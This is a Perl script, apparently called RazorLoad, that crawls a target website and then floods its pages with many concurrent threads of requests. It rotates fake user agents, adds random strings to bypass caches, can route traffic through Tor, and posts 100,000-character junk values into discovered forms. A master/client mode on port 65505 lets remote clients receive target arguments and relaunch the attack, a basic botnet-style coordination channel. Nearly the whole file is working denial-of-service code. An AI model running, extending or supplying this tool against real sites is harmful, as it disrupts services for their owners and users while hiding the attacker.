#!/usr/bin/perl -w
# Andres Martin 25-03-2016
# Perl multi-thread code shamelessly taken from http://chicken.genouest.org/perl/multi-threading-with-perl/
# Requires LWP, LWP::UserAgent and LWP::Protocol::socks
use threads;
use Switch;
use strict;
use warnings;
use HTTP::Request;
use LWP::UserAgent;
use HTTP::Request::Common; 
use Getopt::Long qw(GetOptions);
use Term::ANSIColor;
use Carp;
use POSIX qw( setsid );
use IO::Socket;
use IO::Socket::INET;

my $optionmessage="-u URL(comma separated) -string <String> [0 to skip crawl] -proc [concurrent processes] -rounds [rounds] 
		\t--cachebypass\t Try to bypass cache
		\t--tor\t Use local tor sockets (default config only)
		\t--timeout <seconds> [default 1]
		\t--debug\t lots of shit output
		\t--forms\ti to add random posts on forms
		\t --help\t to show this message
		...or just
		\t--client to connect to master
		\t--master to start a server\n";

### Define what we need
my $parameters = $#ARGV + 1;
my $clientmode = 0;
my $mastermode = 0;
my $masterserver = "localhost";
my @a = (); #??
my @b = (); #??
my @urls = ();
my @razor_pages = ();
my $mastertarget;
my $ua = LWP::UserAgent->new;
my $protocol;
my( $url, $string, $processes, $rounds, $rootdomain);
my $cachebypass=0;
my $tor=0;
my $timeout=1;
my $debugging=0;
my $intinerator = 0;
my $runforms=0;
my $help;
### Done

### Do we start the client?
if ( $ARGV[0] && $ARGV[0] =~ /--client/ ) {
	$clientmode=1;
	start_client();
}

if ( $ARGV[0] && $ARGV[0] =~ /--master/ ) {
        $mastermode=1;
	my $server_port = get_server_port();
	$mastertarget="--url,http://localhost,-s,localhost,-p,1,-r,1,--cachebypass,--timeout,1";
	handle_connections( $server_port );
	exit 0;
}

### Starting main execution
process_options();
start_assault(); 

sub process_options {

### Let's set the options:
#print "received: @ARGV\n\n";
GetOptions(     'url=s' => \$url,
                'string=s' => \$string,
                'procs=i' => \$processes,
                'rounds=i' => \$rounds,
                'cachebypass' => \$cachebypass,
                'tor' => \$tor,
                'timeout:i' => \$timeout,
		'forms' => \$runforms,
		'help' => \$help,
		'client' => \$clientmode,
		'master' => \$mastermode,
                'debug' => \$debugging) or die "\n***not enough / invalid options.\nUsage: $0 $optionmessage";
unless ( defined($url) && defined($string) && defined($processes) && defined($rounds) ) { die "Usage: $0 $optionmessage"; }

if ((defined($help))&&($help eq "1")) { die "Usage: $0 $optionmessage"; }

#Set defaults
if ( ! $cachebypass ) { $cachebypass=0; }
if ( ! $tor ) { $tor=0;}
if (! $timeout ) { $timeout=1; }
if (! $debugging ) { $debugging=0; }
}


### This function lists the pages for each url introduced. It will try to append protocol to links found around, sometimes fails.
sub list_pages() {
        #Autoflush output
        $| = 1;

	$ua->agent('RazorLoad/0.1');
	my @razor_products_page = split /\,/, $url;

	### it will split the code and try to fetch the links
	foreach (@razor_products_page) {
		my $request = HTTP::Request->new(GET => $_);
		my $response = $ua->request($request);
		if ($response->is_success) {
			my $body = $response->decoded_content;
			my @tmp = split / /, $body; 
			my $tmp_url;
			foreach (@tmp) {
				if ($_ =~ /href\=/) {
					$_ =~ s/href\=//g;
					$_ =~ s/\'//g;
					$_ =~ s/\"//g;
					if ($_ !~ /http/) {
						if ( $debugging eq "1" ) { print "bad url found: " . $_ . " going to correct this\n"; }
							if ( $_ =~ /^\// ) {
								$tmp_url=$protocol . "://" . $rootdomain . $_;
							} else {
								$tmp_url=$protocol . "://" . $rootdomain . "/" . $_;
							}
						} else {
						$tmp_url=$_;
					
					}
					if ($tmp_url =~ ">") {
						if ( $debugging eq "1" ) { print "bad url found with symbol > : " . $_ . " going to correct this\n"; }
						my @tmp_url1 = split /\>/, $tmp_url;
	                                       	$tmp_url=$tmp_url1[0];
					}
	
	                                elsif ($tmp_url =~ "<") {
	                                        if ( $debugging eq "1" ) { print "bad url found with symbol <: " . $_ . " going to correct this\n"; }
	                                        my @tmp_url1 = split /</, $tmp_url;
	                                        $tmp_url=$tmp_url1[0];
	                                }
	
					if ($tmp_url =~ /(.*)\.(.*){1,3}\/$/) { 
						if ( $debugging eq "1" ) { print "Found trailing slash\n"; }
						$tmp_url =~ s/\/$//;
					}
					if ($tmp_url !~ /^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?/) {
					if ( $debugging eq "1" ) { print "is this a bad url?: " . $_ . "\n"; }
					}
	
					if ($tmp_url =~ m/(javascript|document\.create)/) {
                	                        if ( $debugging eq "1" ) { print "Bad url with javascript mixed content, skipping " . $_ . "\n"; }
						next;
	                                }
					if ($tmp_url =~ m/(google\.|googleapis\.|gmail\.)/) {
						if ( $debugging eq "1" ) { print "Better don't try this " . $_ . "\n"; }
	                                        next;
	                                }
	
					if ( $debugging eq "1" ) { print "\tURL found in main body: " . $tmp_url . "\n"; }
						
					push @razor_pages,$tmp_url;
		
				}
			}
		}
	}

	if ( $string eq "0" ) {
		splice( @razor_pages ); 	
		push @razor_pages,"$url";
		print "Testing single url $url\n";
		}
	print "Total urls fetched: " . scalar @razor_pages . "\n\n\n";
	
}

sub generate_post_shit {
        my $shit;
        for (0..100000) { $shit .= chr( int(rand(25) + 65) );}
        return $shit;
}
sub search_form  {
        #Autoflush output
        $| = 1;

        my $frm_url =  $_[0];
        my $request;
        $ua->timeout(2);
        my $forms;
        my $forms_method;
        my @form_params=();
        if ( $debugging eq "1" ) { print "\n URL to test for forms: $frm_url \n "; }
        $ua->agent('RazerLoad/0.1');
	### Vidalia proxy usage
        if ($tor and $tor == "1") {
        	$ua->proxy([qw(http https)] => 'socks://127.0.0.1:9150');
        }
        ### End of Vidalia
        my $frm_request = HTTP::Request->new(GET => $frm_url);
        my $response = $ua->request($frm_request);
        my $forms_counter=1;

        if ($response->is_success) {
                if ( $debugging eq "1" ) { print "Get Successful\n"; } else { print color('magenta'); print "*"; print color('reset'); }
                my $body = $response->decoded_content;
                my @eachform = split /\<[Ff][Oo][Rr][Mm]/, $body;
                foreach (@eachform) {
                        if ( $debugging eq "1" ) { print "Itineration $forms_counter\n"; }
                        $forms_counter++;
                        my @inside_techform= split / /, $_;
                        foreach (@inside_techform) {
                                if ($_ =~ m/[mM][eE][Tt][Hh][Oo][Dd]\=\"(.*)\"/) {
                                        if ( $debugging eq "1" ) { print "$1 method found\n"; }
                                        $forms_method=$1;
                                }
                                if($_ =~ m/[Aa][Cc][Tt][Ii][Oo][Nn]=\"(.*)\"/) {
                                        if ( $debugging eq "1" ) { print "Detected action: $1 \n"; }
                                }
                                if($_ =~ m/[Nn][Aa][Mm][Ee]=\"(.*)\"/) {
                                        if ( $debugging eq "1" ) { print "Variable found: $1\n"; }
                                        push(@form_params,$1);
                                        push(@form_params, "AaA" . generate_post_shit())
                                }
                        }
                if ($forms) {
                        switch ($forms_method) {
                                case /[pP][oO][sS][tT]/ {
                                                                if ( $debugging eq "1" ) { print "Posting $frm_url...\n"; }
                                                                my $post_response = $ua->post( $frm_url . $forms,  \@form_params );
                                                                my $content  = $post_response->decoded_content();

                                                        }
                                case /[gG][eE][tT]/     {
                                                                if ( $debugging eq "1" ) { print "Getting....\n"; }
                                                                my $get_params;
                                                                foreach (@form_params) {
                                                                        my $tmpchar;
                                                                        switch ($_) {
                                                                                case /AaA/ { $tmpchar="&";}
                                                                                else { $tmpchar="="; }
                                                                        }
                                                                        $get_params .= "$_" . $tmpchar;
                                                                }
                                                                my $get_response = $ua->get( $frm_url . $forms . "?" . $get_params );
                                                                my $content  = $get_response->decoded_content();
                                                        }
                                else                    { print "Don't know what to do!\n";}
                        }
                        splice(@form_params);
                }
        }
        }
}

#sub check_url ($ $ $) {
sub check_url {
	#Autoflush output
	$| = 1;
        my @useragents=("Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20","Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.2.20) Gecko/20110805 Ubuntu/10.04 (lucid) Firefox/3.6.20","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.20) Gecko/20110804 Red Hat/3.6-2.el5 Firefox/3.6.20","Mozilla/5.0 (Windows; U; Windows NT 6.0; hu; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20","Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)","Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.20) Gecko/20110803 AskTbFWV5/3.13.0.17701 Firefox/3.6.20 ( .NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20","Mozilla/5.0 (PlayStation 4 1.000) AppleWebKit/536.26 (KHTML, like Gecko)","Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)","Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405");
        my $cardinal;
        #print "Total URLS: " . scalar @razor_pages . "\n";
        foreach (@razor_pages) {

                my $request;
                my $current_url = $_;
                $ua->timeout($timeout);
                if ( $debugging eq "1" ) { print "\n URL to test: $current_url \n "; }
                ### Vidalia proxy
                if ($tor and $tor == "1") {
                        $ua->proxy([qw(http https)] => 'socks://127.0.0.1:9150');
                }
                ### End of Vidalia
                if ( $cachebypass == "1" ) {
                        my @chars = ("A".."Z", "a".."z");
                        my $randomstring;
                        $randomstring .= $chars[rand @chars] for 1..8;
                        if ($_ =~ /\?(.*)=/ ) {
                                $cardinal = "&id=";
                                } else {
                                $cardinal = "?=";
                        }
                        if (($_ =~ /$string/)||( $string eq "0" )) {
                                $request = HTTP::Request->new(GET => $_ . $cardinal . $randomstring);
                        } else { next;}
                } else {
                        if (($_ =~ /$string/)||( $string eq "0" )) { $request = HTTP::Request->new(GET => "$current_url" ); }
                        else { next; }
                }
                # accept cookies ya?
                $ua->cookie_jar({});
                my $tmpagent .= $useragents[rand @useragents];
                $ua->agent($tmpagent);
                my $response = $ua->request($request);
                my $code = $response->code;
#		use Switch;
		switch ($response->code) {
			case /200/ 	{ 
					if ( $debugging eq "1" ) { print "URL " . $_ . " found with 200!\n"; } else {print color('magenta'); print "*";print color('reset'); }
					}
			case /30[0-9]/ 	{
					if ( $debugging eq "1" ) { print "URL " . $_ . " redirects\n"; } else { print color('yellow'); print "-";print color('reset'); }
					}
			case /404/ 	{
					if ( $debugging eq "1" ) { print "URL " . $_ . " not found!\n"; } else { print color('red'); print "404";print color('reset'); }
					}
			case /50[0-9]/ 	{if ( $debugging eq "1" ) { print "URL " . $_ . " error!\n"; } else { print color('red'); print "500";print color('reset'); }}
			else 		{ print "?" . $response->code . "?"; }	
		}
		if ( (defined($runforms)) && ($runforms eq "1")) { search_form($current_url); }
        }
}

sub start_assault {
	
	my $nb_process = $processes;
	my $nb_compute = $rounds;
	my @running = ();
	my @Threads = ();

	print "Getting url " . $url . "\n";
	print "String: " . $string . "\n";
	print "Processes: " . $processes . "\n";
	print "Rounds: " . $rounds . "\n";
	print "We bypass cache?: " . $cachebypass . "\n";
	print "we using tor?: " . $tor . "\n";
	print "Debug?: " . $debugging . "\n";
	print "Run forms: " . $runforms . "\n";

	my @domaintmp= split /\,/, $url;
	@domaintmp=split /\//, $domaintmp[0];
	$rootdomain= $domaintmp[2];

	print "root domain: " . $rootdomain . "\n";
	print "Protocol: " . $domaintmp[0] . "\n";

	if ($domaintmp[0] =~ "https") { $protocol = "https"; }
		else {  $protocol = "http"; }
	
		
	list_pages();
	my $itinerator=0;
	while (scalar @Threads < $nb_compute) {
		@running = threads->list(threads::running);
		
		while (scalar @running < $nb_process) {
			if ( $debugging eq "1" ) { print "Starting process...\n";}
			if ( $debugging eq "1" ) { print "Processes: $nb_process \n";}
			if ( $debugging eq "1" ) { print "Running: " . scalar @running . "\n";}
			my $thread = threads->new( sub {
							check_url($itinerator, \@a, \@b);
							});
			$intinerator++;
			push (@Threads, $thread);
			@running = threads->list(threads::running);
			if ( $debugging eq "1" ) { print color('yellow'); print "Added thread. Now we have " . scalar @Threads . " and " . scalar @running . " processes\n"; print color('reset'); }
			my $tid = $thread->tid;
			
		}
																#@running = threads->list(threads::running);
		foreach my $thr (@Threads) {
			if ($thr->is_running()) {
						my $tid = $thr->tid;
			}
			elsif ($thr->is_joinable()) {
						my $tid = $thr->tid;
						$thr->join;
			}
		}
	
																#@running = threads->list(threads::running);
		$itinerator++;
		while (scalar @running != 0) {
				foreach my $thr (@Threads) {
							$thr->join if ($thr->is_joinable());
				}
				@running = threads->list(threads::running);
				}
	}

        print color('blue');
        print "\n\n\n\t\t ***** Finished with " . $intinerator . " rounds *****!\n\n";
        print color('reset');

}
sub start_client {
while (1) { 

        # auto-flush on socket
        $| = 1;
 
        # create a connecting socket
        my $socket = new IO::Socket::INET (
            PeerHost => $masterserver,
            PeerPort => '65505',
            Proto => 'tcp',
            Timeout => '1',
        );
        next unless $socket;
        print "connected to the server\n";
 
        my $response = "";
        $socket->recv($response, 1024);
        sleep(2);
        if ( $response ) { 
                print "received greeting: $response\n";
                my $hello = "Valar dohaeris\n";
		print "Sending handshake\n";
                $socket->send($hello);
		sleep(1); 
		print "Preparing to receive orders\n";
		$socket->recv($response,1024);
 		if ($response) {
			my $sttime = time;
			my @arguments = split /,/, $response;
			exec($^X, "-T", $0, @arguments) or die "Can't re-exec myself($^X,$0,@arguments): $!\n";
			my $entime = time;
			my $elapse = $entime - $sttime;
			print "Elapsed time : ".$elapse->in_units('minutes')."m\n";
                }
        }
        else { print "No server goes down today...\n";}
        shutdown($socket, 1);
        $socket->close();
        sleep(1);
}
}

sub get_server_port {
    my $server = IO::Socket::INET->new(
        'Proto'     => 'tcp',
        'LocalPort' => 65505,
        'Listen'    => SOMAXCONN,
        'Reuse'     => 1,
    );
    die "can't setup server" unless $server;

    return $server;
}

sub handle_connections {
    my $port = shift;
    my $handled = 0;
	print "Ready...\n";
    while ( my $client = $port->accept() ) {
        $handled++;
        print $client "Valar morghulis#$handled\n";
        my $input = <$client>;
        if ( $input ) { chomp ( $input ); }
        else { next; }
        if ( $input && $input =~ /Valar dohaeris/ ) { 
                #print $client "3 wishes\n";
                print "Soldier detected\n";
		
                print $client $mastertarget . "\n";


                }
        #print $client "Bye, bye.\n";
        close $client;
    }

    return;
}

